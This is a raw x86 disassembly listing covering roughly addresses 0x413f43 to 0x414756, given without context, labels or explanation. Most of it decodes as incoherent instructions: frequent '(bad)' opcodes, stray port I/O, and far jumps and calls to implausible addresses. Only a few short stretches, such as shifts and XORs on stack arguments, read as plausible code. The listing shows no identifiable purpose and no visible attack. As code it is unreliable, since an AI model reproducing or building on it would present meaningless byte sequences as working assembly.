  413f43:	add    BYTE PTR [edi-0xa],cl
  413f46:	and    BYTE PTR [ebp+0x36],0x7
  413f4a:	mov    al,0xfb
  413f4c:	mov    dh,0x6
  413f4e:	clc    
  413f4f:	mov    DWORD PTR [ebx-0x2aad6d30],eax
  413f55:	mov    DWORD PTR [eax+eiz*1],esi
  413f58:	les    ebx,FWORD PTR [edi]
  413f5a:	xlat   BYTE PTR ds:[ebx]
  413f5b:	push   edx
  413f5c:	loopne 0x413f3e
  413f5e:	in     al,dx
  413f5f:	shl    DWORD PTR [ebx-0x3b00dac8],1
  413f65:	jne    0x413f0b
  413f67:	dec    ecx
  413f68:	leave  
  413f69:	fiadd  DWORD PTR [ebx+0x52925e28]
  413f6f:	cwd    
  413f71:	test   eax,0xf09a13a4
  413f76:	aad    0x83
  413f78:	mov    eax,0x60ca3fd2
  413f7d:	push   eax
  413f7e:	cs xor ebx,ecx
  413f81:	or     bh,BYTE PTR [edx]
  413f83:	das    
  413f84:	nop
  413f85:	cs (bad) 
  413f88:	sbb    al,0x49
  413f8a:	dec    edx
  413f8b:	int3   
  413f8c:	add    BYTE PTR [edi-0x5b],dl
  413f8f:	adc    ch,BYTE PTR [ebx+0x1e9ced01]
  413f95:	inc    eax
  413f96:	iret   
  413f97:	xchg   cl,al
  413f99:	adc    ecx,DWORD PTR [edx+ebx*1-0x17f67e7a]
  413fa0:	dec    ebp
  413fa1:	inc    eax
  413fa2:	gs push edi
  413fa4:	xchg   esi,eax
  413fa5:	sub    eax,0xd022fee6
  413faa:	fprem1 
  413fac:	jg     0x414029
  413fae:	call   0xc4e0c609
  413fb3:	jg     0x413f77
  413fb5:	adc    eax,0x282ddaf
  413fba:	and    bl,BYTE PTR [ecx+0x6ab45cb0]
  413fc0:	js     0x413f57
  413fc2:	jge    0x413fc0
  413fc4:	inc    edx
  413fc5:	add    eax,0x4a063cab
  413fca:	cli    
  413fcb:	mov    bl,0xb4
  413fcd:	icebp  
  413fce:	mov    ebx,0x9717b8f1
  413fd3:	cwde   
  413fd4:	test   al,0x5
  413fd6:	cmp    DWORD PTR [esi-0x8],ecx
  413fd9:	pop    ss
  413fda:	icebp  
  413fdb:	(bad)  
  413fdd:	and    dl,dh
  413fdf:	cmc    
  413fe0:	xchg   esi,eax
  413fe1:	add    BYTE PTR [edx-0x6c],bh
  413fe4:	add    bh,BYTE PTR [ecx-0x1d]
  413fe7:	retf   0xcae5
  413fea:	(bad)  
  413feb:	(bad)  
  413fec:	mov    bl,0xb5
  413fee:	out    0x29,al
  413ff0:	gs clc 
  413ff2:	dec    edx
  413ff3:	mov    dl,0x40
  413ff5:	adc    al,BYTE PTR [esi+0x4e44c877]
  413ffb:	mov    ebp,0xc5eaa14e
  414000:	adc    BYTE PTR [ecx+0x3],0x43
  414004:	and    dh,BYTE PTR [esi-0x47f0358d]
  41400a:	sub    ebx,esp
  41400c:	mov    WORD PTR [edx],?
  41400e:	push   es
  41400f:	xchg   ebx,eax
  414010:	jo     0x413ffe
  414012:	cdq    
  414013:	in     al,dx
  414014:	daa    
  414015:	aam    0xdc
  414017:	mov    al,0x4a
  414019:	out    dx,al
  41401a:	add    BYTE PTR [esi-0xe],dh
  41401d:	leave  
  41401e:	nop
  41401f:	out    dx,al
  414020:	xchg   ebx,eax
  414021:	mov    ebx,0x95fd2ed7
  414026:	loop   0x414039
  414028:	shr    DWORD PTR [ebx+0x770c6e99],cl
  41402e:	xchg   ebx,eax
  41402f:	and    bh,BYTE PTR ds:[ebp-0x43cb3472]
  414036:	retf   
  414037:	mov    ch,0xed
  41403a:	pop    ss
  41403b:	repnz inc esi
  41403d:	loop   0x41403b
  41403f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414040:	clc    
  414041:	mov    WORD PTR [esi+0x4c],?
  414044:	lods   eax,DWORD PTR ds:[esi]
  414045:	xor    BYTE PTR [ecx-0x37],0x55
  414049:	mov    ebx,0xa5f8bf38
  41404e:	pop    eax
  41404f:	adc    BYTE PTR [ecx-0x27],cl
  414052:	fadd   DWORD PTR fs:[esi+edi*4-0x6c89d8d9]
  41405a:	lods   al,BYTE PTR ds:[esi]
  41405b:	sbb    DWORD PTR [ebx-0x70],esi
  41405e:	fidivr WORD PTR [ecx-0x22]
  414061:	into   
  414062:	cld    
  414063:	sbb    BYTE PTR [ecx+0x5ff0d253],0x26
  41406a:	adc    eax,0x8ba7c01a
  41406f:	fcom   DWORD PTR ss:[edx+edx*8-0x3b]
  414074:	sub    al,0x22
  414076:	xchg   esi,eax
  414077:	lock cmp al,0x8b
  41407a:	dec    ebp
  41407b:	adc    BYTE PTR [ebx-0x2dccebab],cl
  414081:	shl    ecx,0x1e
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx-0x3235b7a]
  4140b7:	cld    
  4140b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140b9:	dec    ebx
  4140ba:	xchg   edx,eax
  4140bb:	mov    esi,0xbec4edbe
  4140c0:	mov    esi,0x93ad84df
  4140c5:	bound  esp,QWORD PTR [eax+0x2bce99db]
  4140cb:	scas   al,BYTE PTR es:[edi]
  4140cc:	adc    DWORD PTR [edi+0x61baa177],esi
  4140d2:	mov    al,ds:0x774ae99a
  4140d7:	ds jmp 0x414159
  4140da:	push   cs
  4140db:	lds    ebx,FWORD PTR [eax]
  4140dd:	xor    eax,0x2c47986b
  4140e2:	ss dec ecx
  4140e4:	bound  esp,QWORD PTR [eax-0x73]
  4140e7:	fdiv   DWORD PTR ds:0xebb1443e
  4140ed:	inc    eax
  4140ee:	pop    eax
  4140ef:	jecxz  0x41416e
  4140f1:	aam    0x41
  4140f3:	sub    DWORD PTR [edx-0x2cbcfc],0xe1a5de13
  4140fd:	or     DWORD PTR [eax-0xa],ebp
  414100:	mov    ebx,0x5eda3b70
  414105:	gs and eax,0x6f3e5945
  41410b:	bound  ecx,QWORD PTR [esi-0x41ead392]
  414111:	mov    edi,0xb0f9e5ab
  414116:	in     al,0xe7
  414118:	popa   
  414119:	jl     0x414115
  41411b:	push   0x28
  41411d:	push   ebp
  41411e:	xor    ch,0x1a
  414121:	sub    edi,DWORD PTR [edi]
  414123:	cli    
  414124:	jnp    0x4140e8
  414126:	jns    0x4140bc
  414128:	enter  0x8153,0x22
  41412c:	cwde   
  41412d:	retf   0x7f4f
  414130:	pop    es
  414131:	int3   
  414132:	dec    ebp
  414133:	(bad)  
  414134:	retf   
  414135:	and    BYTE PTR [ecx+0x63],0x45
  414139:	dec    ecx
  41413a:	add    eax,0xcadd8418
  41413f:	sub    al,0xd8
  414141:	mov    eax,0x61c5949d
  414146:	imul   edi,eax,0xe9fc5ea9
  41414c:	scas   al,BYTE PTR es:[edi]
  41414d:	mov    esi,ds
  41414f:	add    BYTE PTR [ecx],0x46
  414152:	push   ebx
  414153:	jmp    0xfe8b85bc
  414158:	in     al,0x9
  41415a:	adc    BYTE PTR [ecx-0x308cf292],0x78
  414161:	mov    ch,dl
  414163:	fidiv  DWORD PTR [eax+0x33]
  414166:	aaa    
  414167:	inc    ecx
  414168:	scas   al,BYTE PTR es:[edi]
  414169:	pop    esi
  41416a:	push   0x2aa3bbe8
  41416f:	inc    sp
  414171:	jl     0x4141ed
  414173:	mov    dl,0x39
  414175:	push   DWORD PTR [edx]
  414177:	out    0x1,eax
  414179:	imul   BYTE PTR [esi]
  41417b:	scas   eax,DWORD PTR es:[edi]
  41417c:	lods   eax,DWORD PTR ds:[esi]
  41417d:	idiv   DWORD PTR [ebx-0x36b83493]
  414183:	sub    DWORD PTR [ebp+eiz*2-0x3cf9a8ab],ecx
  41418a:	arpl   WORD PTR [ecx+0x47],sp
  41418d:	pop    esi
  41418e:	stc    
  41418f:	data16 aaa 
  414191:	adc    eax,0xe0aebc6c
  414196:	iret   
  414197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414198:	cwde   
  414199:	repnz outs dx,DWORD PTR ds:[esi]
  41419b:	push   es
  41419c:	repz cdq 
  41419e:	dec    ecx
  41419f:	add    al,0xa1
  4141a1:	in     al,0x1d
  4141a3:	add    BYTE PTR [ebp+0x3de1a27d],0x30
  4141aa:	and    DWORD PTR [ecx],edx
  4141ac:	outs   dx,BYTE PTR ds:[esi]
  4141ad:	sub    cl,BYTE PTR [ebx]
  4141af:	jmp    0x3099:0x50a8002d
  4141b6:	repnz repz inc esi
  4141b9:	mov    al,0xc0
  4141bb:	mov    bh,0x56
  4141bd:	maskmovq mm0,mm3
  4141c0:	add    esi,DWORD PTR [esi+esi*8+0x407ed005]
  4141c7:	(bad)  
  4141c9:	ds jno 0x414244
  4141cc:	mov    ecx,0xdbe78e9b
  4141d1:	imul   esi,DWORD PTR [eax],0x2dfbd3ff
  4141d7:	(bad)  
  4141d8:	imul   edi,DWORD PTR [ebx+0x26b1982b],0xffffffd1
  4141df:	repz dec eax
  4141e1:	les    ecx,FWORD PTR [ebp+eiz*2+0x2c]
  4141e5:	push   esp
  4141e6:	inc    edi
  4141e7:	and    ah,BYTE PTR [esi]
  4141e9:	sar    DWORD PTR [edi+ebp*2],0x3
  4141ed:	jns    0x414202
  4141ef:	xor    DWORD PTR [edx-0x26],eax
  4141f2:	or     eax,0x8b6bf505
  4141f7:	shl    BYTE PTR [edi],1
  4141f9:	add    eax,0x4ba393ad
  4141fe:	clc    
  4141ff:	(bad)  
  414201:	jge    0x41419e
  414203:	dec    ebp
  414204:	sahf   
  414205:	shl    BYTE PTR [edx],cl
  414207:	push   esi
  414208:	stos   DWORD PTR es:[edi],eax
  414209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41420a:	iret   
  41420b:	ret    0x3cdc
  41420e:	xchg   ebp,eax
  41420f:	pop    edi
  414210:	(bad)  
  414211:	in     eax,dx
  414212:	lods   al,BYTE PTR es:[esi]
  414214:	mov    ecx,0x44316b49
  414219:	outs   dx,DWORD PTR ds:[esi]
  41421a:	pop    es
  41421b:	bound  esi,QWORD PTR [edx]
  41421d:	adc    ch,0x1a
  414220:	xor    BYTE PTR [edx-0x48],dh
  414223:	adc    ah,BYTE PTR [ebp-0x3f6ea0e1]
  414229:	lods   eax,DWORD PTR ds:[esi]
  41422a:	les    ebx,FWORD PTR [edi+ebp*4]
  41422d:	sahf   
  41422e:	mov    esi,0x800019fa
  414234:	adc    eax,0xf48af986
  414239:	and    eax,0x9e5fbdf4
  41423e:	push   ebx
  41423f:	and    ebx,DWORD PTR [ebx]
  414241:	xor    ecx,DWORD PTR [edi-0x4f050083]
  414247:	rol    ecx,0x6
  41424a:	es fcmove st,st(2)
  41424d:	dec    esp
  41424e:	inc    edi
  41424f:	ds push es
  414251:	mov    ch,0xe9
  414253:	xchg   edi,eax
  414254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414255:	je     0x414277
  414257:	xchg   esi,eax
  414258:	outs   dx,BYTE PTR ds:[esi]
  414259:	dec    edx
  41425a:	(bad)  
  41425b:	mov    dl,0xd4
  41425d:	arpl   WORD PTR [ecx],cx
  41425f:	mov    eax,0xb0c0a0ed
  414264:	lods   eax,DWORD PTR es:[esi]
  414266:	push   es
  414267:	popf   
  414268:	cs dec ebp
  41426a:	jg     0x4141f2
  41426c:	fcomip st,st(0)
  41426e:	out    0x23,al
  414270:	call   0xe57419c3
  414275:	xchg   esi,eax
  414276:	jae    0x414231
  414278:	ss mov edx,ebx
  41427b:	es jbe 0x4142d2
  41427e:	mov    esp,0x925bdd66
  414283:	sbb    ch,BYTE PTR [ecx+0x229c491e]
  414289:	aam    0x72
  41428b:	or     edx,0x8
  41428e:	ret    
  41428f:	mov    ebx,0xdd49c021
  414294:	jbe    0x414235
  414296:	sub    BYTE PTR [edx],0x59
  414299:	push   edi
  41429a:	ins    DWORD PTR es:[edi],dx
  41429b:	dec    esi
  41429c:	sbb    eax,0x9f08c871
  4142a1:	inc    esp
  4142a2:	lock cmp ecx,DWORD PTR [esi]
  4142a5:	jle    0x4142d6
  4142a7:	loopne 0x4142b0
  4142a9:	xchg   edx,eax
  4142aa:	xlat   BYTE PTR ds:[ebx]
  4142ab:	jbe    0x4142f1
  4142ad:	jb     0x41423d
  4142af:	push   ebx
  4142b0:	jmp    0xe9e050dd
  4142b5:	adc    BYTE PTR [eax],cl
  4142b7:	into   
  4142b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142b9:	sub    edx,DWORD PTR [eax+eiz*2]
  4142bc:	out    dx,eax
  4142bd:	das    
  4142be:	add    DWORD PTR [edx+0x79419fa7],ebx
  4142c4:	cmp    al,0x5e
  4142c6:	xor    al,al
  4142c8:	jle    0x414335
  4142ca:	popa   
  4142cb:	pop    ecx
  4142cc:	mov    ebx,0x58db502
  4142d1:	shl    DWORD PTR [ebx],cl
  4142d3:	sub    esp,DWORD PTR [edi]
  4142d5:	aas    
  4142d6:	mov    ebx,DWORD PTR [edi-0x28]
  4142d9:	fwait
  4142da:	lea    esp,[esi+0x2776a4d5]
  4142e0:	push   ecx
  4142e1:	add    cl,BYTE PTR [ecx]
  4142e3:	and    al,0x11
  4142e5:	(bad)  [esi+0x66]
  4142e8:	(bad)  
  4142e9:	(bad)  
  4142ea:	jo     0x414333
  4142ec:	jb     0x41431b
  4142ee:	push   es
  4142ef:	jne    0x41430c
  4142f1:	cmp    DWORD PTR [ecx-0x5e9d007d],ecx
  4142f7:	aad    0x26
  4142f9:	shl    BYTE PTR [eax-0x58],0x24
  4142fd:	adc    esp,DWORD PTR [eax+0x2a]
  414300:	xchg   edx,eax
  414301:	xor    DWORD PTR [edi+0x6c],ecx
  414304:	add    eax,DWORD PTR [ecx-0x4e782211]
  41430a:	lahf   
  41430b:	fisttp QWORD PTR [esi-0x1ea1be54]
  414311:	sub    BYTE PTR [edx-0x72],0xce
  414315:	lods   al,BYTE PTR ds:[esi]
  414316:	jp     0x4142b6
  414318:	sub    eax,0x37a317d2
  41431d:	mov    bh,0xce
  41431f:	jb     0x41437d
  414321:	mov    bl,0x63
  414323:	sti    
  414324:	pop    ecx
  414325:	int3   
  414326:	ins    DWORD PTR es:[edi],dx
  414327:	push   ds
  414328:	jge    0x4142ef
  41432a:	arpl   sp,di
  41432c:	(bad)  
  41432d:	mov    ecx,0x119b9059
  414332:	(bad)  
  414333:	cld    
  414334:	push   eax
  414335:	pusha  
  414336:	mov    ds:0x6abfe621,eax
  41433b:	and    cl,BYTE PTR [eax]
  41433d:	shr    BYTE PTR [ecx+0x1e],0xfb
  414341:	pop    esp
  414342:	or     dl,dh
  414344:	or     ah,BYTE PTR [ecx+0x19]
  414347:	or     al,0xf9
  414349:	sbb    BYTE PTR [ebx],bl
  41434b:	shr    ebp,0x83
  41434e:	sbb    ebx,esi
  414350:	mov    WORD PTR [ecx],fs
  414352:	add    eax,DWORD PTR [ecx-0x4272c960]
  414358:	dec    eax
  414359:	xor    dh,BYTE PTR [ecx]
  41435b:	dec    ecx
  41435c:	or     DWORD PTR [eax+0x78910ff9],ecx
  414362:	mov    bh,0xf2
  414364:	mov    DWORD PTR [esi],eax
  414366:	std    
  414367:	xor    ch,0x2b
  41436a:	neg    BYTE PTR [ebx-0x7da05921]
  414370:	es stos DWORD PTR es:[edi],eax
  414372:	cmp    BYTE PTR [esi-0x4da0295a],ch
  414378:	and    esp,ebx
  41437a:	(bad)  
  41437d:	jmp    0xfcf1a45e
  414382:	rep ss stos BYTE PTR es:[edi],al
  414385:	cmp    ebp,DWORD PTR [eax-0x3d]
  414388:	popa   
  414389:	fwait
  41438a:	mov    al,ds:0x15d9a6cc
  41438f:	and    eax,DWORD PTR [edi+esi*8]
  414392:	ror    DWORD PTR [esi+0x67],0xa0
  414396:	(bad)  
  414397:	scas   eax,DWORD PTR es:[edi]
  414398:	push   ebx
  414399:	cmp    ch,0x3c
  41439c:	inc    esi
  41439d:	fstp   QWORD PTR [esi-0x15973160]
  4143a3:	retf   0x610e
  4143a6:	sub    esi,DWORD PTR [ebp-0x38fc14be]
  4143ac:	cmc    
  4143ad:	ficom  WORD PTR [ebp-0x5e]
  4143b1:	mov    bh,0x8
  4143b3:	cmp    al,0x3b
  4143b5:	mov    esp,0x2bc74c43
  4143ba:	jo     0x414429
  4143bc:	sar    DWORD PTR [edx],1
  4143be:	xchg   ebx,eax
  4143bf:	adc    eax,0x41e03c4
  4143c4:	xchg   esi,eax
  4143c5:	pop    edi
  4143c6:	xchg   ebp,eax
  4143c7:	inc    edi
  4143c8:	or     bh,BYTE PTR [eax-0x4b]
  4143cb:	mov    ecx,0x862822ac
  4143d0:	mov    dh,0xb4
  4143d2:	enter  0x4db5,0x33
  4143d6:	aam    0x48
  4143d8:	jmp    0xc103:0x581d760a
  4143df:	mov    ecx,DWORD PTR [ebp+0x10]
  4143e2:	mov    edx,DWORD PTR [ebp+0x14]
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	and    bl,BYTE PTR [edi-0x23]
  414402:	nop
  414403:	jnp    0x41439d
  414405:	mov    esi,0xbec4edbe
  41440a:	mov    esi,0xc44b7087
  41440f:	div    DWORD PTR [edx+0x59]
  414412:	mov    esp,DWORD PTR [ebx+0x73]
  414415:	in     eax,0x9e
  414417:	mov    al,ds:0xfaca03a2
  41441c:	xlat   BYTE PTR ds:[ebx]
  41441d:	mov    al,ds:0x14234fda
  414422:	mov    bl,BYTE PTR [edx+0x41]
  414425:	and    BYTE PTR [ebp+0x54421448],ah
  41442b:	sub    eax,0xbaaa431d
  414430:	fadd   QWORD PTR [eax+0xc54a513]
  414436:	mov    ch,0x40
  414438:	loop   0x41447e
  41443a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41443b:	shl    BYTE PTR [ecx],0xf4
  41443e:	nop
  41443f:	adc    ebx,DWORD PTR cs:[eax-0x35]
  414443:	test   al,0x8f
  414445:	les    ebp,FWORD PTR [ecx-0x507073da]
  41444b:	mov    edx,0x1eb76ba0
  414450:	jae    0x414487
  414452:	mov    DWORD PTR [edi-0x1d],ecx
  414455:	mov    ah,0x1d
  414457:	and    bl,dh
  414459:	xlat   BYTE PTR ds:[ebx]
  41445a:	call   DWORD PTR [esi-0x2ad53222]
  414460:	pop    esi
  414461:	test   eax,0x8a320e7b
  414466:	cmc    
  414467:	jp     0x414435
  414469:	mul    dl
  41446b:	ss pop ebx
  41446d:	and    BYTE PTR [esp+esi*4],al
  414470:	repz cmc 
  414472:	or     eax,DWORD PTR [edi]
  414474:	xor    al,0x81
  414476:	add    al,0x8d
  414478:	data16 icebp 
  41447a:	iret   
  41447b:	shl    BYTE PTR [ebx+eax*8+0x2d472a74],1
  414482:	fwait
  414483:	pop    ecx
  414484:	or     BYTE PTR [ecx+0x207697a8],cl
  41448a:	add    ah,dl
  41448c:	(bad)  
  41448d:	js     0x414451
  41448f:	andnps xmm4,XMMWORD PTR [ebp+0x5e2fab70]
  414496:	mov    dh,0x70
  414498:	leave  
  414499:	mov    dl,0x32
  41449b:	shl    esi,0x59
  41449e:	xchg   esi,ebp
  4144a0:	push   ebx
  4144a1:	repnz pop es
  4144a3:	test   al,0x30
  4144a5:	cmp    al,0x93
  4144a7:	add    dl,bh
  4144a9:	mov    eax,DWORD PTR [ebx+ebx*1]
  4144ac:	in     eax,0x81
  4144ae:	jbe    0x41444c
  4144b0:	sbb    eax,0xfe1d6844
  4144b5:	adc    al,0x1c
  4144b7:	mov    ebp,0x18494909
  4144bc:	lahf   
  4144bd:	pop    ecx
  4144be:	or     BYTE PTR [ebp+0x28e64b51],0x55
  4144c5:	add    BYTE PTR [edx-0x19787da6],0x38
  4144cc:	test   BYTE PTR [ecx+0x3a],0x14
  4144d0:	mov    WORD PTR [edx-0x100321b7],fs
  4144d6:	xor    eax,0xbece6713
  4144db:	es jns 0x414555
  4144de:	pop    ds
  4144df:	and    al,0x18
  4144e1:	iret   
  4144e2:	fcomp  DWORD PTR [ebx-0x52]
  4144e5:	adc    eax,0xee8c4aa8
  4144ea:	aaa    
  4144eb:	mov    cl,BYTE PTR [eax+eiz*8+0x5d5ec896]
  4144f2:	fcomp  DWORD PTR [esi]
  4144f4:	fiadd  DWORD PTR [eax+0x66ccf97a]
  4144fa:	cmp    eax,0x6c8c9ec5
  4144ff:	xlat   BYTE PTR ds:[ebx]
  414500:	fs sti 
  414502:	out    0x3a,eax
  414504:	aad    0x94
  414506:	out    0x8,eax
  414508:	xor    BYTE PTR [edx+0x1d6f3973],bh
  41450e:	js     0x414547
  414510:	inc    esi
  414511:	cdq    
  414512:	xchg   esi,eax
  414513:	add    al,0xcf
  414515:	lock lods eax,DWORD PTR ds:[esi]
  414517:	mov    bl,0xfb
  414519:	mov    edi,0x5c073d69
  41451e:	bound  ecx,QWORD PTR [edx+0x578b0d42]
  414524:	mov    ss:0xedd3405e,eax
  41452a:	leave  
  41452b:	jo     0x4144f7
  41452d:	mov    al,BYTE PTR [esi]
  41452f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414530:	xor    bh,dl
  414532:	arpl   WORD PTR [edi+edi*1-0x1886714c],dx
  414539:	push   eax
  41453a:	aam    0x90
  41453c:	in     eax,dx
  41453d:	pop    esi
  41453e:	inc    ecx
  41453f:	icebp  
  414540:	out    0xef,eax
  414542:	std    
  414543:	cmp    ch,BYTE PTR [edx-0x493efc60]
  414549:	push   esi
  41454a:	in     al,0xff
  41454c:	(bad)  
  41454d:	ret    
  41454e:	mul    DWORD PTR [edx+0x3a65f315]
  414554:	mov    ah,0x71
  414556:	popa   
  414557:	push   ebp
  414558:	push   edx
  414559:	mov    edi,0x7a666e7b
  41455e:	mov    al,ds:0xbe66926b
  414563:	cmp    DWORD PTR [ecx-0x24016233],eax
  414569:	rol    edx,cl
  41456b:	call   0xe550cc5c
  414570:	or     ch,BYTE PTR [ebx]
  414572:	stos   DWORD PTR es:[edi],eax
  414573:	mov    bl,0x79
  414575:	push   0xf40ab961
  41457a:	pop    ss
  41457b:	jmp    0x74:0x9bf5a8de
  414582:	or     eax,0xa147c272
  414587:	xlat   BYTE PTR ds:[ebx]
  414588:	(bad)  es:[esi-0x4a]
  41458c:	cmc    
  41458d:	(bad)  
  41458e:	sub    eax,0x8a2f1542
  414593:	cmp    al,BYTE PTR [ebp+0x53d81962]
  414599:	mov    ebx,0x8a1f467a
  41459e:	dec    esi
  41459f:	(bad)  
  4145a1:	push   ecx
  4145a2:	sub    dh,BYTE PTR [ebx-0x18]
  4145a5:	inc    edx
  4145a6:	and    al,0xbd
  4145a8:	mov    BYTE PTR [edi+0x28],al
  4145ab:	jo     0x4145b0
  4145ad:	fwait
  4145ae:	push   edi
  4145af:	jnp    0x41460e
  4145b1:	push   ds
  4145b2:	(bad)  
  4145b3:	or     eax,0x942b48f7
  4145b8:	int    0x2c
  4145ba:	(bad)  
  4145bc:	stos   DWORD PTR es:[edi],eax
  4145bd:	leave  
  4145be:	out    0x76,eax
  4145c0:	sbb    al,0x7c
  4145c2:	xor    edx,edi
  4145c4:	in     eax,0x3c
  4145c6:	dec    edx
  4145c7:	fisttp DWORD PTR ds:0x23636a84
  4145cd:	mov    al,0x24
  4145cf:	jns    0x414580
  4145d1:	inc    ebp
  4145d2:	ret    
  4145d3:	inc    eax
  4145d4:	mov    dh,BYTE PTR [ebx+0x42079360]
  4145da:	fidiv  DWORD PTR [ebp-0x57e08ff4]
  4145e0:	lods   eax,DWORD PTR ds:[esi]
  4145e1:	sbb    bl,BYTE PTR [ecx+0x4f]
  4145e4:	mov    esp,0x9214284b
  4145e9:	fs cmc 
  4145eb:	sub    al,0x33
  4145ed:	cdq    
  4145ee:	rep outs dx,BYTE PTR ds:[esi]
  4145f0:	xor    al,0x33
  4145f2:	mov    ebx,0x308600d4
  4145f7:	in     eax,0x5d
  4145f9:	js     0x4145ef
  4145fb:	push   ds
  4145fc:	cmp    dl,bh
  4145fe:	adc    al,0x4f
  414600:	neg    DWORD PTR [edi-0x44cf860f]
  414606:	stos   BYTE PTR es:[edi],al
  414607:	sbb    BYTE PTR [esi+eiz*2-0x63],0x84
  41460c:	or     bh,BYTE PTR ds:0x7b5ca945
  414612:	push   ebp
  414613:	mov    ecx,0xbe38d4fb
  414618:	ds inc esi
  41461a:	sbb    DWORD PTR [eax-0x71c4ad52],ebp
  414620:	dec    ebx
  414621:	imul   ecx,DWORD PTR [ebp-0x4f],0x45f84833
  414628:	dec    edi
  414629:	clc    
  41462a:	sub    dh,BYTE PTR [esi+0x28e20271]
  414630:	pop    ecx
  414631:	daa    
  414632:	add    dl,dl
  414634:	adc    bh,BYTE PTR [edi+0x64]
  414637:	mov    BYTE PTR [edx-0x42],ah
  41463a:	mov    eax,ds:0xef5598c0
  41463f:	shr    edi,cl
  414641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414642:	bound  ebp,QWORD PTR [ebp+0x559c03ac]
  414648:	mov    DWORD PTR [eax+0x68cd1868],edi
  41464e:	mov    cl,0xec
  414650:	fnstcw WORD PTR [edx]
  414652:	add    al,0xad
  414654:	jno    0x41462c
  414656:	xor    ebx,edx
  414658:	lods   al,BYTE PTR ds:[esi]
  414659:	fadd   st,st(7)
  41465b:	pop    ebp
  41465c:	cmp    al,dl
  41465e:	jmp    0x4efc:0x14089930
  414665:	push   ebp
  414666:	repz sub edi,edi
  414669:	ror    DWORD PTR [ebx],0xa8
  41466c:	std    
  41466d:	ins    BYTE PTR es:[edi],dx
  41466e:	jmp    0x4146a3
  414670:	int    0xe4
  414672:	out    dx,al
  414673:	cli    
  414674:	adc    eax,0xc2400b06
  414679:	mov    bh,0x1a
  41467b:	lods   al,BYTE PTR ds:[esi]
  41467c:	ja     0x4146da
  41467e:	pusha  
  41467f:	repz sbb al,0xed
  414682:	pop    esi
  414683:	jmp    0x767063f6
  414688:	into   
  414689:	cmp    ah,BYTE PTR [esi+0x7c]
  41468c:	mov    esi,0xa5d3de59
  414691:	enter  0x141b,0x36
  414695:	inc    esi
  414696:	add    dl,BYTE PTR [esi+0x4c1b2b54]
  41469c:	or     BYTE PTR [ebx+0x1c],dh
  41469f:	push   esp
  4146a0:	data16 and BYTE PTR [edx+0x2f0cf220],ah
  4146a7:	pop    edx
  4146a8:	add    ch,ah
  4146aa:	ficomp WORD PTR [ebx-0xb7642f5]
  4146b0:	mov    bl,BYTE PTR [edx+0x5]
  4146b3:	mov    al,0x7f
  4146b5:	nop
  4146b6:	jno    0x41468a
  4146b8:	imul   DWORD PTR [esi]
  4146ba:	out    dx,al
  4146bb:	mov    edx,esi
  4146bd:	ins    DWORD PTR es:[edi],dx
  4146be:	jo     0x4146d8
  4146c0:	dec    ecx
  4146c1:	lds    eax,FWORD PTR [edx-0x58]
  4146c4:	jo     0x4146e0
  4146c6:	mov    ebp,0x631ea584
  4146cb:	add    edi,edx
  4146cd:	es push esi
  4146cf:	lods   al,BYTE PTR ds:[esi]
  4146d0:	push   cs
  4146d1:	call   0x8bdf:0xf1ccdb79
  4146d8:	dec    eax
  4146d9:	and    BYTE PTR [edi-0x1b],0x88
  4146dd:	aaa    
  4146de:	pop    edx
  4146df:	loope  0x414672
  4146e1:	or     al,0xf3
  4146e3:	inc    esi
  4146e4:	aam    0x57
  4146e6:	(bad)  
  4146e7:	rcl    DWORD PTR [ecx-0x26],cl
  4146ea:	call   0xc56b5761
  4146ef:	ficomp DWORD PTR [eax+0x1e]
  4146f2:	fadd   DWORD PTR [edx]
  4146f4:	lock nop
  4146f6:	push   0xf01bf967
  4146fb:	(bad)  
  4146fc:	mov    ch,0xa
  4146fe:	mov    ebx,0xa5a3bf61
  414703:	popf   
  414704:	aad    0xf3
  414706:	popf   
  414707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414708:	addr16 fsubp st(5),st
  41470b:	aam    0xcb
  41470d:	cdq    
  41470e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  414710:	pusha  
  414711:	sbb    esi,DWORD PTR [eax]
  414713:	loope  0x414727
  414715:	out    dx,eax
  414716:	fidiv  WORD PTR [eax]
  414718:	jl     0x41474f
  41471a:	shr    DWORD PTR [ebp+0x4d],cl
  41471d:	dec    ecx
  41471e:	or     bh,BYTE PTR [esi]
  414720:	enter  0x91c5,0x93
  414724:	jg     0x41477e
  414726:	cmp    DWORD PTR [ebx+0x5d8b1055],ecx
  41472c:	adc    al,0x33
  41472e:	fisttp DWORD PTR [ebx]
  414730:	retf   
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
